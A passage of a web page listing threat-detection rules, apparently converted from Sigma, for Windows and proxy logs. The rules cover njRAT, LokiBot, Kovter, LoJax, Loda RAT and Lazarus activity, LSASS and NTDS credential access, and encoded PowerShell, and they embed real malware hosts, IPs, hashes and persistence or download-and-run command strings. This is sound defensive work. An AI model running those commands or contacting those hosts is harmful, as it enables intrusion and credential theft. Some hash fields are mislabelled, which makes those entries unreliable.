GET ds_dnshostname")) condition: $selection 
<li><a href="#">rule hworm_and_njrat_ratbackdoor_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "HWorm and NjRAT Rat/Backdoor Detector. License: ." reference = "" version = "0.01" created = "2018/11/27" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "00df326eee18617fae2fdd3684ac1546" or $selection.target.file.md5 = "1488cdc5c5c9c87b4e0dae27ba3511cb" or $selection.target.file.md5 = "4543daa6936dde54dda8782b89d5daf1" or $selection.target.file.md5 = "80b1f909d1217313c14ea6d4d0b003dc" or $selection.target.file.md5 = "81c153256efd9161f4d89fe5fd7015bc" or $selection.target.file.md5 = "c6b53fc46427527a0739e6b6443ef72d" or $selection.target.file.md5 = "9e273220eb71f849ea99b923cbc1fae3" or $selection.target.file.md5 = "43309710ab8f87dc5d9842a5bca85f80" or $selection.target.file.md5 = "a40faab2f3f546aeb29aaefcb0f751d8" or $selection.target.file.md5 = "617a128b44671ac88df0b7180d9d0135" or $selection.target.file.md5 = "ae5c8ad09954a56f348a3b72ed824363" or $selection.target.file.md5 = "da3e2eeffd78d8c5ef472b8a09e9d325" or $selection.target.file.md5 = "0de41aef336f40a07ed6984db61b52ab" or $selection.target.file.md5 = "e081a42d6e09a3fcf049a33b2ecf0412" or $selection.target.file.md5 = "361c9d44809f788b92023b762e363449" or $selection.target.file.md5 = "c46a631f0bc82d8c2d46e9d8634cc50242987fa7749cac097439298d1d0c1d6e" or $selection.target.file.md5 = "25bc108a683d25a77efcac89b45f0478d9ddd281a9a2fb1f55fc6992a93aa830" or $selection.target.file.md5 = "b957911d7d5865e91851ab402189ae86" or $selection.target.file.md5 = "0ab40f5c7d9151742ec29d53fb224ad8")) condition: $selection 
<li><a href="#">rule invocation_of_active_directory_diagnostic_tool_ntdsutilexe { meta: author = "Thomas Patzke" description = "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT) License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "credential_access, t1003" events: (re.regex($selection.target.process.command_line, `.*\\ntdsutil.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule judgement_panda_exfil_activity { meta: author = "Florian Roth" description = "Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike License: ." reference = "" version = "0.01" created = "2019/02/21" category = "process_creation" product = "windows" mitre = "credential_access, t1081, t1003" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((re.regex($selection1.target.process.file.full_path, `.*\\xcopy\.exe`) and re.regex($selection1.target.process.command_line, `.* /S /E /C /Q /H \\.*`)) or (re.regex($selection1.target.process.file.full_path, `.*\\adexplorer\.exe`) and re.regex($selection1.target.process.command_line, `.* -snapshot \"\" c:\\users\\.*`)))) condition: $selection1 
<li><a href="#">rule kerberos_manipulation { meta: author = "Florian Roth" description = "This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "credential_access, t1212" events: (($selection.metadata.product_event_type = "675" or $selection.metadata.product_event_type = "4768" or $selection.metadata.product_event_type = "4769" or $selection.metadata.product_event_type = "4771") and ($selection.security_result.description = "0x9" or $selection.security_result.description = "0xA" or $selection.security_result.description = "0xB" or $selection.security_result.description = "0xF" or $selection.security_result.description = "0x10" or $selection.security_result.description = "0x11" or $selection.security_result.description = "0x13" or $selection.security_result.description = "0x14" or $selection.security_result.description = "0x1A" or $selection.security_result.description = "0x1F" or $selection.security_result.description = "0x21" or $selection.security_result.description = "0x22" or $selection.security_result.description = "0x23" or $selection.security_result.description = "0x24" or $selection.security_result.description = "0x26" or $selection.security_result.description = "0x27" or $selection.security_result.description = "0x28" or $selection.security_result.description = "0x29" or $selection.security_result.description = "0x2C" or $selection.security_result.description = "0x2D" or $selection.security_result.description = "0x2E" or $selection.security_result.description = "0x2F" or $selection.security_result.description = "0x31" or $selection.security_result.description = "0x32" or $selection.security_result.description = "0x3E" or $selection.security_result.description = "0x3F" or $selection.security_result.description = "0x40" or $selection.security_result.description = "0x41" or $selection.security_result.description = "0x43" or $selection.security_result.description = "0x44")) condition: $selection 
<li><a href="#">rule keylogger_detector_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "keylogger is a simple standalone executable that sets global keyboard hooks and writes all keystrokes into a file in an encrypted form. License: ." reference = "" version = "0.01" created = "2018/06/01" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "21921864D2F1AB2761C36031A2E1D2C00C9B304A" or $selection.target.file.md5 = "3C2D0615BEF6F88FED6E308D4F45B6133080C74F" or $selection.target.file.md5 = "91E8346910E0E6783ACFC4F2B9A745C81BD7573A")) condition: $selection 
<li><a href="#">rule kingminer_cryptojacker_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "KingMiner cryptojacker Detector. License: ." reference = "" version = "0.01" created = "2018/11/30" product = "windows" service = "sysmon" mitre = "Execution, t1204" events: ($selection.metadata.product_event_type = "1" and ($selection.target.file.md5 = "dea32433519c4628deeac802c0f1435a1b0d27d89f1ae5c1729ec7223f9eb04d" or $selection.target.file.md5 = "147d572d7f6664c8adf42ef92e4dbad06c5d21cc820a20163d814c77136cfbab" or $selection.target.file.md5 = "122b7906a359deb22bf777c602ac2619ca5ea156c4937dcdf96583210677db52" or $selection.target.file.md5 = "c5894d2afc946c064f8c2b58791fe64b48e26f0da5bdcc6ef9ba147f334f43f9" or $selection.target.file.md5 = "e61fbe58c28720ac4c0a1822d5da9a622a24f352d34e6c1cf5f704dbdd9b9b34" or $selection.target.file.md5 = "2b54329a13c4f79bea3886a21a7ba5fe19c4418596b774893fdef020e03ed07d" or $selection.target.file.md5 = "f128a63c107c3006ebf448d6ec743d11eb491ecb508e4ce63ba084f9792c25da" or $selection.target.file.md5 = "7357bdf70d042f246de1f830de783499d75e61388eed93d9ce74180ce06524d0" or $selection.target.file.md5 = "956a1231726503d840794af61fb6ac9bc326296597eff1c8da636f84e3c32874" or $selection.target.file.md5 = "8fa8cdb771d7c66406a7116e9c09ed18030afb1f94430c807782274f3847cb92" or $selection.target.file.md5 = "a3598d3301630ba64aa7663980296b59df243f5f17ed1b4fd56dcbcab599231c")) condition: $selection 
<li><a href="#">rule klist_purge { meta: author = "Ruslan Mikhalov, SOC Prime Team" description = "Delete Evidence of Pass-the-Ticket attack License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Defense Evasion, t1070" events: ($sysmon_klistpurge.metadata.product_event_type = "1" and re.regex($sysmon_klistpurge.target.process.command_line, `klist.*purge`)) condition: $sysmon_klistpurge 
<li><a href="#">rule kovter_malware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects characteristics of the Kovter malware strain License: ." reference = "" version = "0.01" created = "2019/07/30" product = "windows" service = "sysmon" mitre = "execution, t1059, persistence, t1060" events: (($selection1.metadata.product_event_type = "13" and ($selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\POLICIES\\MICROSOFT\\WINDOWS\\WINDOWSUPDATE" or $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\POLICIES\\MICROSOFT\\WINDOWS\\WINDOWSUPDATE\\OSUPGRADE" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" or $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\POLICIES\\MICROSOFT\\WINDOWS\\WindowsUpdate" or $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\POLICIES\\MICROSOFT\\WINDOWS\\WINDOWSUPDATE\\OSUpgrade" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\xvyg" or $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\WOW6432NODE\\xvyg " or $selection1.target.registry.registry_key = "HKCR\\7b507" or $selection1.target.registry.registry_key = "HKCR\\7B507\\shell" or $selection1.target.registry.registry_key = "HKCR\\7B507\\SHELL\\open" or $selection1.target.registry.registry_key = "HKCR\\7B507\\SHELL\\OPEN\\command" or $selection1.target.registry.registry_key = "HKCR\\.16a05d" or $selection1.target.registry.registry_key = "HKCR\\.16A05D" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" or $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\MICROSOFT\\SYSTEMCERTIFICATES\\AUTHROOT\\CERTIFICATES\\DAC9024F54D8F6DF94935FB1732638CA6AD77C13" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\9OVFKL4" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\IUV2K1GDZ" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\IUV2K1GDZ" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\TYG6ZX" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\5WGIB69" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\0wn0hDCj1e" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\0WN0HDCJ1E") and ($selection1.target.registry.registry_value_data = "CURAMV" or $selection1.target.registry.registry_value_data = "VuVY43ROT" or $selection1.target.registry.registry_value_data = "VR6KTbo" or $selection1.target.registry.registry_value_data = "49rU6evnxC" or $selection1.target.registry.registry_value_data = "Y4d5jxtm" or $selection1.target.registry.registry_value_data = "xSnk64X" or $selection1.target.registry.registry_value_data = "IxF25a" or $selection1.target.registry.registry_value_data = "DC1iXk9" or $selection1.target.registry.registry_value_data = "Blob" or $selection1.target.registry.registry_value_data = "vrxzdhbyv" or $selection1.target.registry.registry_value_data = "ssishoff" or $selection1.target.registry.registry_value_data = "ReservationsAllowed" or $selection1.target.registry.registry_value_data = "DisableOSUpgrade")) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\39b03.*`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\39b03\\6a5cc\.16a05d.*`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\39b03\\7cbdf\.bat`) or re.regex($selection1.target.file.full_path, `.*\\Local Settings\\Application Data\\2501\\1ffa\.41d68`) or re.regex($selection1.target.file.full_path, `.*\\Local Settings\\Application Data\\2501\\aae7\.bat`)))) condition: $selection1 
<li><a href="#">rule lazarus_attack_variant { meta: author = "Ariel Millahuel" description = "Detects a Lazarus attack variant via move.exe and reg.exe License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1059" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (($selection1.target.process.file.full_path = "move.exe" and ($selection1.target.process.command_line = "move \"c:\\perflogs\\1.dat\" \"c:\\programdata\\microsoft\\sqcsvc\\sqcsvc6.ldx\"" or $selection1.target.process.command_line = "move \"c:\\perflogs\\1.dll\" \"c:\\windows\\system32\\sqcsvc.dll\"" or $selection1.target.process.command_line = "move \"c:\\perflogs\\1.dll.mui\" \"c:\\windows\\system32\\sqcsvc.dll.mui\"")) or ($selection1.target.process.file.full_path = "reg.exe" and ($selection1.target.process.command_line = "reg add \"HKLM\\SYSTEM\\ControlSet001\\Services\\sqcsvc\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%SystemRoot%\\System32\\sqcsvc.dll\"" or $selection1.target.process.command_line = "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v sqcsvc /t REG_ MULTI_SZ /d sqcsvc")))) condition: $selection1 
<li><a href="#">rule loda_rat_detection { meta: author = "Ariel Millahuel" description = "Loda is a Remote Access Trojan with spying capabilities License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, T1059" events: ($selection1.target.process.file.full_path = "cmd.exe" and (re.regex($selection1.target.process.command_line, `cmd\.exe & /C CD C:/ & msiexec\.exe /i http.*://lcodigo\.com/apiW/config/uploads/tmp/.*\.msi /quiet`) or re.regex($selection1.target.process.command_line, `cmd\.exe & /C CD C:/ & msiexec\.exe /i http.*://.*\.com/api.*/config/uploads/tmp/.*\.msi /quiet`)) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1")) condition: $selection1 
<li><a href="#">rule logon_scripts_userinitmprlogonscript { meta: author = "Tom Ueltschi (@c_APT_ure)" description = "Detects creation or execution of UserInitMprLogonScript persistence method License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "t1037, persistence, lateral_movement" events: (((($exec_selection.metadata.product_event_type = "1" and re.regex($exec_selection.src.process.file.full_path, `.*\\userinit\.exe`)) and not (re.regex($exec_selection.target.process.file.full_path, `.*\\explorer\.exe`) and re.regex($exec_selection.target.process.command_line, `.*\\netlogon\.bat`))) or (($exec_selection.metadata.product_event_type = "11" or $exec_selection.metadata.product_event_type = "12" or $exec_selection.metadata.product_event_type = "13" or $exec_selection.metadata.product_event_type = "14") and re.regex($exec_selection.target.registry.registry_key, `.*UserInitMprLogonScript.*`))) or ($exec_selection.metadata.product_event_type = "1" and re.regex($exec_selection.target.process.command_line, `.*UserInitMprLogonScript.*`))) condition: $exec_selection 
<li><a href="#">rule lojack_doubleagent_communication { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "Lojack Double-Agent Communication Detection. License: ." reference = "" version = "0.01" created = "2008/04/01" product = "proxy" mitre = "Command and Control, t1071, t1043" events: ($selection.target.hostname = "sysanalyticweb.com" or $selection.target.hostname = "elaxo.org" or $selection.target.hostname = "ikmtrust.com" or $selection.target.hostname = "lxwo.org") condition: $selection 
<li><a href="#">rule lojax_malware_proxyfirewall { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "LoJax rootkit Detector (Sednit group). License: ." reference = "" version = "0.01" created = "2019/01/17" product = "proxy" mitre = "Command and Control, t1071" events: (($SelectionSRC.principal.ip = "185.77.129.106" or $SelectionSRC.principal.ip = "185.144.82.239" or $SelectionSRC.principal.ip = "93.113.131.103" or $SelectionSRC.principal.ip = "185.86.149.54" or $SelectionSRC.principal.ip = "185.86.151.104" or $SelectionSRC.principal.ip = "103.41.177.43" or $SelectionSRC.principal.ip = "185.86.148.184" or $SelectionSRC.principal.ip = "185.94.191.65" or $SelectionSRC.principal.ip = "86.106.131.54" or $SelectionSRC.principal.ip = "169.239.12.133" or $SelectionSRC.principal.ip = "185.86.151.2") or ($SelectionSRC.target.ip = "185.77.129.106" or $SelectionSRC.target.ip = "185.144.82.239" or $SelectionSRC.target.ip = "93.113.131.103" or $SelectionSRC.target.ip = "185.86.149.54" or $SelectionSRC.target.ip = "185.86.151.104" or $SelectionSRC.target.ip = "103.41.177.43" or $SelectionSRC.target.ip = "185.86.148.184" or $SelectionSRC.target.ip = "185.94.191.65" or $SelectionSRC.target.ip = "86.106.131.54" or $SelectionSRC.target.ip = "169.239.12.133" or $SelectionSRC.target.ip = "185.86.151.2") or (re.regex($SelectionSRC.target.hostname, `.*secao\.org.*`) or re.regex($SelectionSRC.target.hostname, `.*ikmtrust\.com.*`) or re.regex($SelectionSRC.target.hostname, `.*sysanalyticweb\.com.*`) or re.regex($SelectionSRC.target.hostname, `.*lxwo\.org.*`) or re.regex($SelectionSRC.target.hostname, `.*jflynci\.com.*`) or re.regex($SelectionSRC.target.hostname, `.*remotepx\.net.*`) or re.regex($SelectionSRC.target.hostname, `.*rdsnets\.com.*`) or re.regex($SelectionSRC.target.hostname, `.*rpcnetconnect\.com.*`) or re.regex($SelectionSRC.target.hostname, `.*webstp\.com.*`) or re.regex($SelectionSRC.target.hostname, `.*elaxo\.org.*`))) condition: $SelectionSRC 
<li><a href="#">rule lokibot_detector_windows10_sysmon_behavior { meta: author = "Lee Archinal" description = "This content detects a sample of the LokiBot as observed in a private malware lab and detonated on a Windows 10 machine. License: ." reference = "" version = "0.01" created = "2020/08/10" product = "windows" service = "sysmon" mitre = "defense_evasion, execution, persistence, privilege_escalation, t1085, t1053" events: ($selection1.metadata.product_event_type = "1" and (((($selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\Fondue.exe" or $selection1.target.process.file.full_path = "C:\\Windows\\System32\\Fondue.exe" or $selection1.target.process.file.full_path = "C:\\Windows\\System32\\OptionalFeatures.exe") and ($selection1.target.process.command_line = "C:\\Windows\\system32\\fondue.exe /enable-feature:NetFx3 /caller-name:mscoreei.dll" or $selection1.target.process.command_line = "C:\\Windows\\sysnative\\FonDUE.EXE /enable-feature:NetFx3 /caller-name:mscoreei.dll" or $selection1.target.process.command_line = "C:\\Windows\\system32\\OptionalFeatures.EXE /enable-feature:NetFx3 /caller-name:mscoreei.dll")) or ($selection1.target.process.file.full_path = "C:\\Windows\\System32\\rundll32.exe" and re.regex($selection1.target.process.command_line, `C:\\Windows\\System32\\rundll32\.exe C:\\Windows\\System32\\shell32\.dll,SHCreateLocalServerRunDll .* -Embedding`))) or ($selection1.target.process.file.full_path = "C:\\Windows\\SysWOW64\\schtasks.exe" and re.regex($selection1.target.process.command_line, `C:\\Windows\\System32\\schtasks\.exe /Create /TN Updates\\&startupname& /XML .*\\AppData\\Local\\Temp.*\.tmp`)))) condition: $selection1 
<li><a href="#">rule lokibot_malware_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "This content will detect the charactaristics of the Lokibot strain of malware that was found in the wild License: ." reference = "" version = "0.01" created = "2019/06/12" product = "windows" service = "sysmon" mitre = "execution, t1059" events: ((($selection1.metadata.product_event_type = "1" and ((($selection1.target.process.file.full_path = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe " and $selection1.target.process.command_line = "powershell -WindowStyle Hidden ") or (re.regex($selection1.target.process.file.full_path, `.*csc\.exe`) and re.regex($selection1.target.process.command_line, `.*csc\.exe\" /noconfig /fullpaths @C:.*\.cmdline `) and $selection1.src.process.file.full_path = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe ")) or (re.regex($selection1.target.process.file.full_path, `.*cvtres\.exe`) and re.regex($selection1.src.process.file.full_path, `.*csc\.exe`)))) or ($selection1.metadata.product_event_type = "3" and re.regex($selection1.target.process.file.full_path, `.*EQNEDT32\.EXE`) and $selection1.target.ip = "127.0.0.1")) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.process.file.full_path, `.*powershell\.exe`) and (re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\Temp.*\.tmp`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\Temp.*\.out`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\Temp.*\.err`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Local\\Temp.*\.dll`) or re.regex($selection1.target.file.full_path, `.*\\AppData\\Roaming.*\.exe`)))) condition: $selection1 
<li><a href="#">rule lokibot_malware_detector_sysmon_behavior_july_2019 { meta: author = "Lee Archinal" description = "This content detects characteristics of the Lokibot Malware that was found in July 2019 License: ." reference = "" version = "0.01" created = "2019/08/07" product = "windows" service = "sysmon" mitre = "defense_evasion, persistence, t1112, t1060" events: ((($selection1.metadata.product_event_type = "13" and (((($selection1.target.registry.registry_key = "HKCU\\Software\\VB and VBA Program Settings\\HcMI61124620925\\x60E5372900416" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\VB AND VBA PROGRAM SETTINGS\\HcMI61124620925" or $selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\VB and VBA Program Settings" or $selection1.target.registry.registry_key = "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings" or $selection1.target.registry.registry_key = "HKLM\\Software\\Microsoft\\RADAR\\HeapLeakDetection\\Settings\\LeakDiagnosisAttempted" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\MICROSOFT\\RADAR\\HEAPLEAKDETECTION\\DIAGNOSEDAPPLICATIONS\\40413c204bb0867c9e93f83dc86d23cfcd420485519ffe9d27557585677d66d6.exe" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\" or $selection1.target.registry.registry_key = "HKLM\\") or ($selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN" and $selection1.metadata.description = "cghjjfygjhkjhgfghjt")) or ($selection1.target.registry.registry_key = "HKLM\\SOFTWARE\\MICROSOFT\\RADAR\\HEAPLEAKDETECTION\\DIAGNOSEDAPPLICATIONS\\40413C204BB0867C9E93F83DC86D23CFCD420485519FFE9D27557585677D66D6.EXE" and $selection1.metadata.description = "LastDetectionTime")) or ($selection1.target.registry.registry_key = "HKCU\\SOFTWARE\\VB AND VBA PROGRAM SETTINGS\\HCMI61124620925\\X60E5372900416" and $selection1.metadata.description = "bnVpl1584056334"))) or ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*\\D282E1\\1E80C5\.lck`) or re.regex($selection1.target.file.full_path, `.*\\D282E1`) or re.regex($selection1.target.file.full_path, `.*\\subfolder\\filename\.vbs`) or re.regex($selection1.target.file.full_path, `.*\\subfolder`) or re.regex($selection1.target.file.full_path, `.*\\subfolder\\filename\.exe`) or re.regex($selection1.target.file.full_path, `.*\\cghjjfygjhkjhgfghjt`) or re.regex($selection1.target.file.full_path, `.*\\cghjjfygjhkjhgfghjt\\cghjjfygjhkjhgfghjt\.exe`) or re.regex($selection1.target.file.full_path, `.*\\cghjjfygjhkjhgfghjt\\cghjjfygjhkjhgfghjt\.vbs`)))) or ($selection1.metadata.product_event_type = "1" and (re.regex($selection1.target.process.file.full_path, `.*\\filename\.exe`) or re.regex($selection1.target.process.file.full_path, `.*\\cghjjfygjhkjhgfghjt\\cghjjfygjhkjhgfghjt\.exe`)))) condition: $selection1 
<li><a href="#">rule lokibot_trojan_behavior_sysmon { meta: author = "Alexandr Yampolskyi, SOC Prime" description = "LokiBot Trojan behavior. License: ." reference = "" version = "0.01" created = "2019/02/04" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: (($selection1.metadata.product_event_type = "1" and (($selection1.target.process.command_line = "GET /bobby" or $selection1.target.process.command_line = "POST /bobby/Panel") or ($selection1.target.file.md5 = "3C4BE617FDA78DA05B38F4EE52121E99" or $selection1.target.file.md5 = "7FB5A88768D7ECE242DBD4B30EDEFF0C" or $selection1.target.file.md5 = "14A4DFFE0105A7DEF2A1EFF32899A9AC" or $selection1.target.file.md5 = "E69245E9685CB204105E69C424F304CC" or $selection1.target.file.md5 = "75CCD03BB4934490A9F599A15381F43D" or $selection1.target.file.md5 = "68BEFE15006189CE8215371935F8E720" or $selection1.target.file.md5 = "05869152534B238D25051F7718FDB382" or $selection1.target.file.md5 = "3DFA31D85482009479FEAFD5AF7E818A" or $selection1.target.file.md5 = "f9b5535bffd5c0525cb1e59bf79f06d925448b12f106fe1e972473fab4f082fa" or $selection1.target.file.md5 = "4bf2658e0f69865c977cabd24b8dccca38ffc09a17b3367e5f702d2993cf00f7" or $selection1.target.file.md5 = "ed5550d3047903d3e09363f90b6d49f519d1484af4e528fd95f1e5f3e5a008b2" or $selection1.target.file.md5 = "5b1b12f580dcc0219e88887cbe5af7f2" or $selection1.target.file.md5 = "51c86d4fe87f490e4da5e8035645e548" or $selection1.target.file.md5 = "c94d4d0a893a786d51e4acbb66c3cd29" or $selection1.target.file.md5 = "007b3818d95f328376d73f3714c49154" or $selection1.target.file.md5 = "D3E758016C147B5035E20D22E6888E6F" or $selection1.target.file.md5 = "09ef7c56d36365fd24d45660c3246a0a" or $selection1.target.file.md5 = "42844D8957C46DD47EFFEC1C54273EFC" or $selection1.target.file.md5 = "D4BBE7685E53F6B788F65268BEA485C3" or $selection1.target.file.md5 = "B18F0AD651B48B3DEC184B4F95BFCAE3"))) or ($selection1.metadata.product_event_type = "11" and re.regex($selection1.target.registry.registry_key, `.*F63AAA`))) condition: $selection1 
<li><a href="#">rule lolbas_wslexe_via_cmdline { meta: author = "Den Iuzvyk" description = "Detects usage of wsl.exe License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1204, T1202" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (re.regex($selection1.src.process.file.full_path, `.*\\wsl\.exe`) or (re.regex($selection1.target.process.file.full_path, `.*\\wsl\.exe`) and (re.regex($selection1.target.process.command_line, `.*--exec.*`) or re.regex($selection1.target.process.command_line, `.*-e.*`) or re.regex($selection1.target.process.command_line, `.*-u.*`))))) condition: $selection1 
<li><a href="#">rule lsass_access_detected_via_attack_surface_reduction { meta: author = "Markus Neis" description = "Detects Access to LSASS Process License: ." reference = "" version = "0.01" created = "2018/08/26" product = "windows_defender" mitre = "credential_access, t1003" events: ($selection.metadata.product_event_type = "1121" and re.regex($selection.target.file.full_path, `.*\\lsass\.exe`)) condition: $selection 
<li><a href="#">rule lsassexe_detected_running_from_a_suspicious_location { meta: author = "Lee Archinal" description = "This detects Lsass.exe not running from C:\\Windows\\System32\\lsass.exe License: ." reference = "" version = "0.01" created = "2019/07/08" product = "windows" service = "sysmon" events: (($selection1.metadata.product_event_type = "1" and re.regex($selection1.target.process.file.full_path, `.*lsass\.exe`)) and not ($selection1.target.process.file.full_path = "C:\\Windows\\System32\\lsass.exe")) condition: $selection1 
<li><a href="#">rule malicious_base64_encoded_powershell_keywords_in_command_lines { meta: author = "John Lambert (rule)" description = "Detects base64 encoded strings used in hidden malicious PowerShell command lines License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (re.regex($encoded.target.process.file.full_path, `.*\\powershell\.exe`) and re.regex($encoded.target.process.command_line, `.* hidden .*`) and (re.regex($encoded.target.process.command_line, `.*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA.*`) or re.regex($encoded.target.process.command_line, `.*aXRzYWRtaW4gL3RyYW5zZmVy.*`) or re.regex($encoded.target.process.command_line, `.*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA.*`) or re.regex($encoded.target.process.command_line, `.*JpdHNhZG1pbiAvdHJhbnNmZX.*`) or re.regex($encoded.target.process.command_line, `.*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg.*`) or re.regex($encoded.target.process.command_line, `.*Yml0c2FkbWluIC90cmFuc2Zlc.*`) or re.regex($encoded.target.process.command_line, `.*AGMAaAB1AG4AawBfAHMAaQB6AGUA.*`) or re.regex($encoded.target.process.command_line, `.*JABjAGgAdQBuAGsAXwBzAGkAegBlA.*`) or re.regex($encoded.target.process.command_line, `.*JGNodW5rX3Npem.*`) or re.regex($encoded.target.process.command_line, `.*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ.*`) or re.regex($encoded.target.process.command_line, `.*RjaHVua19zaXpl.*`) or re.regex($encoded.target.process.command_line, `.*Y2h1bmtfc2l6Z.*`) or re.regex($encoded.target.process.command_line, `.*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A.*`) or re.regex($encoded.target.process.command_line, `.*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg.*`) or re.regex($encoded.target.process.command_line, `.*lPLkNvbXByZXNzaW9u.*`) or re.regex($encoded.target.process.command_line, `.*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA.*`) or re.regex($encoded.target.process.command_line, `.*SU8uQ29tcHJlc3Npb2.*`) or re.regex($encoded.target.process.command_line, `.*Ty5Db21wcmVzc2lvb.*`) or re.regex($encoded.target.process.command_line, `.*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ.*`) or re.regex($encoded.target.process.command_line, `.*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA.*`) or re.regex($encoded.target.process.command_line, `.*lPLk1lbW9yeVN0cmVhb.*`) or re.regex($encoded.target.process.command_line, `.*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A.*`) or re.regex($encoded.target.process.command_line, `.*SU8uTWVtb3J5U3RyZWFt.*`) or re.regex($encoded.target.process.command_line, `.*Ty5NZW1vcnlTdHJlYW.*`) or re.regex($encoded.target.process.command_line, `.*4ARwBlAHQAQwBoAHUAbgBrA.*`) or re.regex($encoded.target.process.command_line, `.*5HZXRDaHVua.*`) or re.regex($encoded.target.process.command_line, `.*AEcAZQB0AEMAaAB1AG4Aaw.*`) or re.regex($encoded.target.process.command_line, `.*LgBHAGUAdABDAGgAdQBuAGsA.*`) or re.regex($encoded.target.process.command_line, `.*LkdldENodW5r.*`) or re.regex($encoded.target.process.command_line, `.*R2V0Q2h1bm.*`) or re.regex($encoded.target.process.command_line, `.*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A.*`) or re.regex($encoded.target.process.command_line, `.*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA.*`) or re.regex($encoded.target.process.command_line, `.*RIUkVBRF9JTkZPNj.*`) or 